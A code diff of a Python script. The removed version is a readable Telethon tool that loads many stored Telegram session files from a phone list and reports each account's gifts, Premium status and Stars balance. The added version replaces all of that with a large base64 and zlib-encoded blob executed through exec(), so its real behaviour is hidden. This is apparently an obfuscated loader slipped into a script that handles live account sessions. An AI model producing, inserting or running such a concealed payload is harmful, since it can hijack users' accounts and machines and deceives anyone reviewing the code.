@@ -1,109 +1,16 @@
-from telethon.sync import TelegramClient
-from telethon import utils, functions
-from telethon.tl.functions.users import GetFullUserRequest
-from telethon.errors import (
-    SessionPasswordNeededError,
-    PhoneNumberBannedError,
-    PhoneCodeInvalidError,
-    PhoneCodeExpiredError,
-    RPCError,
-    AuthKeyError,
+import zlib,base64,codecs
+payload = (
+    "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"
 )
-import csv
-from data import er, err  # API_ID va API_HASH
 
-print("\nAzaboi")
-print("Mavjud raqamlar ✅")
-index = 0
-
-results = []
-
-with open('phone.csv', 'r') as f:
-    str_list = [row[0] for row in csv.reader(f)]
-
-    for pphone in str_list:
-        api_id = er
-        api_hash = err
-        phone = utils.parse_phone(pphone)
-        index += 1
-
-        client = TelegramClient(f"sessions/{phone}", api_id, api_hash)
-
-        try:
-            client.connect()
-            if not client.is_user_authorized():
-                print(f"Akk {index}: +{phone}")
-                print("⚠️ Sessiya avtorizatsiya qilinmagan (kod/parol kerak). SKIP qilindi!\n")
-                continue
-
-            me = client.get_me()
-            full = client(GetFullUserRequest(me.id))
-            gifts_count = getattr(full.full_user, 'stargifts_count', None)
-            is_premium = getattr(me, 'premium', False)
-            result = client(functions.payments.GetStarsStatusRequest(peer=me.id))
-            stars_balance = result.balance.amount if hasattr(result.balance, 'amount') else 0
-
-            first_name = me.first_name or ""
-            last_name = me.last_name or ""
-            full_name = (first_name + " " + last_name).strip()
-            username = f"@{me.username}" if me.username else ""
-
-            print(f"Akk {index}: +{phone} | {full_name} | {username}")
-
-            # Gift
-            if gifts_count and gifts_count > 0:
-                print(f"🎁 Gift bor! Gifts count: {gifts_count}")
-            else:
-                print("❌ Gift yo'q")
-
-            # Premium
-            if is_premium:
-                print("✅ Premium foydalanuvchi!")
-            else:
-                print("❌ Premium emas")
-
-            # Stars
-            if stars_balance > 0:
-                print(f"⭐ Stars bor! Balance: {stars_balance}")
-            else:
-                print("❌ Stars yo'q")
-
-            print()  # Bo‘sh qator bilan ajratish
-
-            if (gifts_count and gifts_count > 0) or is_premium or stars_balance > 0:
-                results.append({
-                    "index": index,
-                    "phone": phone,
-                    "full_name": full_name,
-                    "username": username,
-                    "gift": gifts_count,
-                    "premium": is_premium,
-                    "stars": stars_balance
-                })
-
-        except (
-            SessionPasswordNeededError,
-            PhoneNumberBannedError,
-            PhoneCodeInvalidError,
-            PhoneCodeExpiredError,
-            RPCError,
-            AuthKeyError,
-            ConnectionError,
-            OSError
-        ) as e:
-            print(f"Akk {index}: +{phone}")
-            print(f"⚠️ Skipped: {e}\n")
-
-        except Exception as e:
-            print(f"Akk {index}: +{phone}")
-            print(f"⚠️ Skipped unknown error: {e}\n")
-
-        finally:
-            client.disconnect()
-
-print("\n=== Yakuniy ro'yxat: BOR bo‘lganlar ===\n")
-if results:
-    for r in results:
-        print(f"{r['index']}) +{r['phone']} | {r['full_name']} | {r['username']} | 🎁 Gift: {r['gift']} | 🏆 Premium: {r['premium']} | ⭐ Stars: {r['stars']}")
-else:
-    print("Hech bir akkauntda gift/premium/stars topilmadi.")
+# payload end
+exec(codecs.decode(zlib.decompress(base64.b64decode(payload)), 'utf-8'))
